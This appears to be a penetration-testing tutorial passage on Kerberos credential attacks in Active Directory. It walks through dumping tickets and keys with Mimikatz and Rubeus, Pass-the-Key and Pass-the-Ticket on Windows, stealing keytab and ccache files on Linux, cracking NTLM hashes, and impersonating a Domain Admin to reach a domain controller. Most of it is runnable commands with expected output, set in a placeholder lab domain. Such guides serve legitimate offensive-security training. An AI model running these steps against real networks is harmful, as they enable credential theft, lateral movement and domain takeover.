**Expected output**

```cmd
Directory: c:\Users\Public

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2025   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-domain.local.kirbi
-a----        7/12/2025   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.domain.local.kirbi
```

The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.

> **NOTE:** Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

</details>

<details>
<summary><h5>Rubeus - Export tickets</h5></summary>

**Start Rubeus as Adminitrator**

```cmd
Rubeus.exe dump /nowrap
```

</details>

</details>

<details>
<summary><h4>Pass the Key / OverPass the Hash</h4></summary>

The traditional **Pass-the‑Hash (PtH)** technique exploits NTLM hashes directly, bypassing Kerberos altogether by using the hash to authenticate via NTLM. In contrast, the **Pass‑the‑Key**, also known as **OverPass‑the‑Hash**, leverages a user’s key—such as an NT hash (`RC4‑HMAC`) or AES key—to request a legitimate Kerberos TGT from the domain controller. This approach forges a **Ticket Granting Ticket (TGT)** without needing the user's plaintext password.

To forge our tickets, we need to have the user's hash.

<details>
<summary><h5>Mimikatz - Extract Kerberos keys</h5></summary>

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Extract Kerberos keys**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

**Expcted Output**

```cmd
Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : <USER>
Domain            : RTH
Logon Server      : DC01
Logon Time        : 7/12/2025 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : <USER>
         * Domain   : <corp.rth>
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using Mimikatz and Rubeus.

</details>

<details>
<summary><h5>Mimikatz - Pass the Key aka. OverPass the Hash</h5></summary>

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Extract Kerberos keys**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:<corp.rth> /user:<USER> /ntlm:<NTLM_HASH>
```

**Expcted Output**

```cmd
user    : <USER>
domain  : <corp.rth>
program : cmd.exe
impers. : no
NTLM    : <NTLM_HASH>
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```

This will create a new **cmd.exe** window that we can use to request access to any service we want in the context of the target user.

</details>

<details>
<summary><h5>Rubeus - Pass the Key aka. OverPass the Hash</h5></summary>

**Start Rubeus**

```cmd
Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3Sfe60 /nowrap
```

> **NOTE:** Rubeus doesn't require administrative rights to perform the Pass the Key.

> **NOTE:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an `rc4_hmac` (NTLM) hash in a Kerberos exchange instead of an `aes256_cts_hmac_sha1` (or aes128) key, it may be detected as an "encryption downgrade."

To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus asktgt, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

</details>

</details>

<details>
<summary><h4>Pass the Ticket (PtT)</h4></summary>

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

<details>
<summary><h5>Rubeus - Pass the Ticket (OPTION 1)</h4></summary>

After executing an OverPass‑the‑Hash attack, you may obtain the resulting ticket in Base64 format. Rather than manually exporting and importing it, you can use the */ptt* flag to automatically inject that ticket—whether it's a **TGT** or a **TGS**—into the current logon session.

```cmd
Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /rc4:<HASH> /ptt
```

Expected output

```cmd
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: <HASH>
[*] Building AS-REQ (w/ preauth) for: '<corp.rth>\<USER>'
[+] TGT request successful!
[*] Base64(ticket.kirbi):
      <BASE64 TICKET>
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/<corp.rth>
  ServiceRealm          :  <corp.rth>
  UserName              :  <USER>
  UserRealm             :  <corp.rth>
  StartTime             :  7/12/2025 12:27:47 PM
  EndTime               :  7/12/2025 10:27:47 PM
  RenewTill             :  7/19/2025 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
```

Note that now it displays `Ticket successfully imported!`.

</details>

<details>
<summary><h5>Rubeus - Pass the Ticket (OPTION 2)</h5></summary>

Another way is to import the ticket into the current session using the .kirbi file from the disk.


**Use a ticket exported from Mimikatz and import it using Pass the Ticket:**

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi
```

**Expected output:**

```cmd
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!
```

**Verify that your ticket let you access DC01’s filesystem:**

```cmd
dir \\DC01.<corp.rth>\c$
```

**Expected output:**

```cmd
Directory: \\dc01.<corp.rth>\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2025  11:17 AM                Program Files
d-----         6/4/2025  11:17 AM                Program Files (x86)
...
```

</details>

<details>
<summary><h5>Rubeus - Pass the Ticket (OPTION 3)</h5></summary>

We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. 

**Use PowerShell to convert a .kirbi to Base64:**

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"))
```

**Expected output:**

```cmd
<BASE64_TICKET>
```

**Using Rubeus, provide the Base64 string instead of the file name:**

```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

**Expected output:**

```cmd
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!
```

**Verify that your ticket let you access DC01’s filesystem:**

```cmd
dir \\DC01.<corp.rth>\c$
```

**Expected output:**

```cmd
Directory: \\dc01.<corp.rth>\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2025  11:17 AM                Program Files
d-----         6/4/2025  11:17 AM                Program Files (x86)
...
```

</details>

<details>
<summary><h5>Mimikatz - Pass the Ticket</h5></summary>

We can also perform the **Pass the Ticket** attack using the Mimikatz module `kerberos::ptt` and the `.kirbi` file that contains the ticket we want to import.

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Perform the Pass the Ticket attack**

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
mimikatz # exit
```

**Verify that your ticket let you access DC01’s filesystem:**

```cmd
dir \\DC01.<corp.rth>\c$
```

**Expected output:**

```cmd
Directory: \\dc01.<corp.rth>\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2025  11:17 AM                Program Files
d-----         6/4/2025  11:17 AM                Program Files (x86)
...
```

</details>

</details>

<details>
<summary><h4>Pass The Ticket with PowerShell Remoting (Windows)</h4></summary>

[PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.5&viewFallbackFrom=powershell-7.2) enables administrators to execute scripts or manage commands remotely on Windows systems. It's powered by WinRM, which operates using the WS‑Management (WS‑Man) protocol and listens on two primary ports:

* **TCP 5985 for HTTP**
* **TCP 5986 for HTTPS (SSL/TLS-secured)**

To initiate a PowerShell Remoting session on a remote system, a user must meet one of the following criteria:

* Be a member of the local Administrators group
* Belong to the Remote Management Users group
* Have explicit permissions set on the session configuration within PowerShell

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.

<details>
<summary><h5>Mimikatz - Pass the Ticket for lateral movement</h5></summary>

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Perform the Pass the Ticket attack**

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
mimikatz # exit
```

**Start PowerShell**

```cmd
powershell
```

**Connect to the target machine**

```powershell
Enter-PSSession -ComputerName DC01
```

**Verify your current session**

```powershell
whoami
```

**Expected output**

```powershell
<corp.rth>\<USER>
```

</details>

</details>

<details>
<summary><h4>Rubeus - PowerShell Remoting with Pass the Ticket</h4></summary>

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). By default, the process is hidden; use the /show flag to display it. This prevents the erasure of existing TGTs for the current logon session.

**Create a sacrificial process with Rubeus:**

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

**Expected output**

```cmd
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

</details>

<details>
<summary><h4>Rubeus - Pass the Ticket for lateral movement</h4></summary>

```cmd
Rubeus.exe asktgt /user:<USER> /domain:<corp.rth> /aes256:<AES_KEY> /ptt
```

**Expected output**

```powershell
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: <AES_KEY>
[*] Building AS-REQ (w/ preauth) for: '<corp.rth>\<USER>'
[*] Using domain controller: <IP>:<PORT>
[+] TGT request successful!
[*] Base64(ticket.kirbi):
      <BASE64_TICKET>
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/<corp.rth>
  ServiceRealm             :  <CORP.RTH>
  UserName                 :  <USER>
  UserRealm                :  <CORP.RTH>
  StartTime                :  7/18/2025 5:44:50 AM
  EndTime                  :  7/18/2025 3:44:50 PM
  RenewTill                :  7/25/2025 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  <AES_KEY>
```

**Start PowerShell**

```cmd
powershell
```

**Connect to the target machine**

```powershell
Enter-PSSession -ComputerName DC01
```

**Verify your current session**

```powershell
whoami
```

**Expected output**

```powershell
<corp.rth>\<USER>
```

</details>

</details>

<details>
<summary><h3>PtT from Linux</h3></summary>

If a Linux machine is joined to Active Directory and uses Kerberos for authentication, tickets might be stored in one of several ways—depending on configuration and tooling 

> **Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.


<details>
<summary><h4>Introduction</h4></summary>

TGT/TGS Request Flow is the same across Windows and Linux, but storage mechanisms differ based on OS and configuration. In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable **KRB5CCNAME**. These ccache files are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?id=kb_article_view&sysparm_article=KB0024956) files. A keytab is a file that stores one or more Kerberos principals (user or service identities) paired with their encrypted keys—the keys are derived from the principal’s password and used during authentication without prompting the user for credentials. When a user changes their password, all keytab files associated with that principal must be recreated, because the encrypted keys within depend on the current password.

Typical uses of keytab files include:

* Letting services or scripts authenticate asutomatically to Kerberos without plain-text passwords or interactive login 
* Enabling scheduled or background processes to access network resources (e.g., mounting SMB shares) via Kerberos.

> **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.<CORP.RTH>`

</details>

<details>
<summary><h4>1. Identify Domain Integration</h4></summary>

<details>
<summary><h5>Option 1: realm</h5></summary>

The [realm](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) utility is designed for domain discovery, enrollment, and managing which domain users or groups can access the local system.

**Check if Linux machine is domain-joined:**

```bash
realm list
```

**Expected output:**

```bash
# <corp.rth>
#   type: kerberos
#   realm-name: <CORP.RTH>
#   domain-name: <corp.rth>
#   configured: kerberos-member
#   server-software: active-directory
#   client-software: sssd
#   required-package: sssd-tools
#   required-package: sssd
#   required-package: libnss-sss
#   required-package: libpam-sss
#   required-package: adcli
#   required-package: samba-common-bin
#   login-formats: %U@<corp.rth>
#   login-policy: allow-permitted-logins
#   permitted-logins: david@<corp.rth>, julio@<corp.rth>
#   permitted-groups: Linux Admins
```

**Key Findings from realm list**

1. Domain Join Configuration
    * Domain: domain
    * Realm: DOMAIN (Kerberos realm)
    * Type: kerberos
    * Server Software: active-directory (Windows AD)
    * Client Software: sssd (Linux-side authentication)

2. Authentication Setup
    * Required Packages:
        * `sssd-tools`, `sssd` (core SSSD services)
        * `libnss-sss` (Name Service Switch integration)
        * `libpam-sss` (PAM module for AD logins)
        * `adcli` (AD command-line tools)
        * `samba-common-bin` (Samba utilities, though Winbind isn’t primary)

3. Login Policies
    * Login Format: `user@domain`
    * Explicitly allowed users:
        * david@domain
        * julio@domain
    * Permitted Groups: `Linux Admins` (members of this AD group can log in)

</details>

<details>
<summary><h5>Option 2: PS</h5></summary>

**Check if Linux machine is domain-joined:**

```bash
ps -ef | grep -i "winbind\|sssd"
```

**Expected output:**

```bash
# root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
# root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files
# root        1001     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
# root        1002     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
# root       11451       1  0 17:25 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
# david@i+   16815   16801  0 18:01 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
```

**Key Findings from the ps Output**

1. sssd (System Security Services Daemon) is Running
    * `/usr/sbin/sssd -i`
        * Main SSSD process
    * `/usr/libexec/sssd/sssd_be`
        * Backend service, handles AD/LDAP communication
    * `/usr/libexec/sssd/sssd_nss`
        * Name Service Switch integration for AD users/groups
    * `/usr/libexec/sssd/sssd_pam`
        * Pluggable Authentication Module for AD logins
    * `/usr/libexec/sssd/sssd_pac`
        * Handles Kerberos PAC validation for AD trusts

2. Domain Configuration
    * The `--domain` flag in `sssd_be` explicitly shows the AD domain this machine is joined to.

3. No `winbind` (Samba) Process
    * The machine uses SSSD (not Samba/Winbind) for AD integration, which is common for modern Linux-AD joins.

</details>

</details>

<details>
<summary><h4>2. Locate Kerberos Credentials</h4></summary>

On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings.

<details>
<summary><h5>Finding KeyTab files</h5></summary>

**Use Find to search for files with keytab in the name:**

```bash
find / -name *keytab* -ls 2>/dev/null
```

**Expected output:**

```bash
# 131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
# 262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

</details>

<details>
<summary><h5>Identifying KeyTab files in Cronjobs</h5></summary>

**Step 1: Identify KeyTab files in Cronjobs:**

```bash
crontab -l
```

**Expected output:**

```bash
# m h  dom mon dow   command
# *5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
```

**Step 2: Inspect script for KeyTab usage:**

```bash
cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
```

**Expected output:**

```bash
#!/bin/bash

# kinit svc_workstations@<CORP.RTH> -k -t /home/carlos@<corp.rth>/.scripts/svc_workstations.kt
# smbclient //dc01.<corp.rth>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<corp.rth>/script-test-results.txt
```

</details>

<details>
<summary><h5>Finding ccache files</h5></summary>

<details>
<summary><h5>Reviewing environment variables for ccache files</h5></summary>

**Identify the location of our Kerberos credentials cache:**

```bash
env | grep -i krb5
```

**Expected output:**

```bash
# KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

</details>

<details>
<summary><h5>Searching for ccache files in /tmp</h5></summary>

Ccache files are located, by default, at `/tmp`.

**1. Read information from a keytab file:**

```bash
ls -la /tmp
```

**Expected output:**

```bash
# total 68
# drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
# drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
# -rw-------  1 julio@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
# -rw-------  1 david@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
# -rw-------  1 carlos@<corp.rth> domain users@<corp.rth> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

We can now impersonate the user with kinit.

> **Note:** `kinit` is case-sensitive—ensure you enter the principal exactly as shown in klist. For example, if the keytab shows the username in lowercase and the realm in uppercase, you must match that casing exactly.

</details>

</details>

</details>

<details>
<summary><h4>3. Backup Existing Tickets (Optional but recommended)</h4></summary>

Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.

**Create the backup**

```bash
echo $KRB5CCNAME
cp "$KRB5CCNAME" /tmp/backup_ccache
```

This lets you restore the original ticket later, preserving session continuity and credentials.

</details>

<details>
<summary><h4>4. Extract Credentials</h4></summary>

A keytab file lists one or more Kerberos principals along with their encrypted secret keys (derived from the user password). To use a keytab file, we need to know which user it was created for.

<details>
<summary><h5>Keytab Files</h5></summary>

<details>
<summary><h6>Option 1: Accessing Domain Shares via Impersonation</h6></summary>

**Step 1: Verify the current Kerberos ticket**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
# Default principal: david@<corp.rth>

# Valid starting     Expires            Service principal
# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<CORP.RTH>@<CORP.RTH>
#         renew until 10/07/25 17:02:11
```

> **Note:** At this point, the active user is david.

---

**Step 2: Authenticate using the specified keytab, without entering a password.**

```bash
kinit carlos@<CORP.RTH> -k -t /opt/specialfiles/carlos.keytab
```

**Step 3: Confirm the change:**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
# Default principal: carlos@<CORP.RTH>

# Valid starting     Expires            Service principal
# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<CORP.RTH>@<CORP.RTH>
```

> **Note:** The active principal is now carlos, indicating the ticket switched successfully.

---

**Step 4: Connecting to SMB Share as Carlos:**

```bash
smbclient //dc01/carlos -k -c ls
```

**Expected Output:**

```bash
#   .                                   D        0  Thu Oct  6 14:46:26 2022
#   ..                                  D        0  Thu Oct  6 14:46:26 2022
#   carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

#                 7706623 blocks of size 4096. 4452852 blocks available
```

</details>

<details>
<summary><h6>Option 2: Direct Access to Linux Account (Using Password)</h6></summary>

We can use KeyTabExtract—a Python script—to extract data from version 0x502 .keytab files used for Kerberos authentication on Linux systems. This script can be found in its [GitHub repository](https://github.com/sosdave/KeyTabExtract) or [`here`](../scripts/passwords/keytabextract.py).

* Realm
* Service Principal
* Encryption Types
* Hashes (e.g. NTLM, AES-256, AES-128)

---

**Step 1: Use KeyTabExtract to extract the info**

```bash
python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
```

**Expected Output:**

```bash
# [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
# [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
# [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
# [+] Keytab File successfully imported.
#         REALM : <CORP.RTH>
#         SERVICE PRINCIPAL : carlos/
#         NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
#         AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
#         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

---

**Step 2: Crack the password**

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

> **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.

---

**Step 3: Log in as the desired user**

```bash
su - carlos@<corp.rth>
```

**Step 4: Obtain more hashes**

The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.

</details>

</details>

<details>
<summary><h5>Ccache</h5></summary>

To abuse a `.ccache` file, we only need read access. These files are typically stored in `/tmp` and are readable only by the user who created them. However, if we obtain root access, we can read and leverage these files.

After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.

**Step 1: Connect to Target**

```bash
ssh svc_workstations@<corp.rth>@<IP> -p <PORT_TO_FORWARD>
```

**Step 2: Check Sudo Permissions**

```bash
sudo -l
```

**Step 3: Elevate to Root**

```bash
sudo su
```

**Step 4: Verify Access**

```bash
whoami
```

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

**Step 5: Search `/tmp` Directory**

```bash
ls -la /tmp
```

**Expected Output:**

```bash
# total 76
# drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
# drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
# -rw-------  1 david@<>            domain users@<> 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
# -rw-------  1 svc_workstations@<> domain users@<> 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
# -rw-------  1 carlos@<>           domain users@<> 3175 Oct  7 11:35 krb5cc_647402606
# -rw-------  1 carlos@<>           domain users@<> 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.

---

**Step 6: Check Group Membership**

```bash
id julio@<corp.rth>
```

**Expected Output:**

```bash
# uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
```

Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.

To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.

**Step 7: Prepare Environment**

```bash
cp /tmp/krb5cc_647401106_HRJDux .
export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
```

**Step 8: Verify Ticket**

```bash
klist
```

**Expected Output:**

```bash
# Ticket cache: FILE:/root/krb5cc_647401106_I8I133
# Default principal: julio@<CORP.RTH>

# Valid starting       Expires              Service principal
# 10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<CORP.RTH>@<CORP.RTH>
#         renew until 10/08/2025 13:25:01
```

> **Note:** Check "Valid starting" and "Expires" times

**Step 9: Access Domain Resources**

```bash
smbclient //dc01/C$ -k -c ls -no-pass
```

**Expected Output:**

```bash
#   $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2024
#   Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2024
#   Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2024
#   john                                D        0  Mon Jul 18 13:19:50 2025
#   julio                               D        0  Mon Jul 18 13:54:02 2025
#   pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2025
#   PerfLogs                            D        0  Fri Feb 25 16:20:48 2025
#   Program Files                      DR        0  Wed Oct  6 20:50:50 2024
#   Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2025
#   ProgramData                       DHn        0  Fri Aug 19 12:18:42 2025
#   SharedFolder                        D        0  Thu Oct  6 14:46:20 2025
#   System Volume Information         DHS        0  Wed Jul 13 19:01:52 2025
#   tools                               D        0  Thu Sep 22 18:19:04 2025
#   Users                              DR        0  Thu Oct  6 11:46:05 2025
#   Windows                             D        0  Wed Oct  5 13:20:00 2025

#                 7706623 blocks of size 4096. 4447612 blocks available
```

> **NOTE:** `klist` displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

</details>

</details>

<details>
<summary><h4>5. (Optional) Use Attack Tools with Kerberos</h4></summary>

Many Linux-based attack tools that interact with Windows and Active Directory environments support Kerberos authentication. When using these tools from a domain-joined machine, it's important to set the `KRB5CCNAME` environment variable to point to the correct ccache file.

However, if we're attacking from a non-domain-joined machine—such as our external attack host—we must ensure that the system can reach the Key Distribution Center (KDC) or Domain Controller, and that domain name resolution is functioning correctly.

In our case, the attack host cannot directly connect to the **KDC** or resolve domain names through the **Domain Controller**. To enable Kerberos-based attacks in this scenario, we need to proxy traffic through an internal host (e.g., **MS01**) using tools like [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains). Additionally, we must manually configure the `/etc/hosts` file to map domain names and target machine hostnames to their corresponding IP addresses.

---

**Modify `/etc/hosts`:**

```bash
echo "<DC01_IP> <corp.rth> dc01.<corp.rth> dc01" | sudo tee -a /etc/hosts
echo "<MS01_IP> ms01.<corp.rth> ms01" | sudo tee -a /etc/hosts
```

**Confirm Changes:**

```bash
cat /etc/hosts
```

**Expected Output**

```bash
# Host addresses

# <IP> <corp.rth> dc01.<corp.rth> dc01
# <IP> ms01.<corp.rth> ms01
```

**Modify `/etc/proxychains.conf`:**

```bash
sudo sed -i '/^\[ProxyList\]/,$c\[ProxyList]\nsocks5 127.0.0.1 1080' /etc/proxychains.conf
```

**Confirm Changes:**

```bash
cat /etc/proxychains.conf
```

**Expected Output**

```bash
# [ProxyList]
# socks5 127.0.0.1 1080
```

---

**Download Chisel to our attack host**

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

**Expected Output**

```bash
# 2025/10/10 07:26:15 server: Reverse tunneling enabled
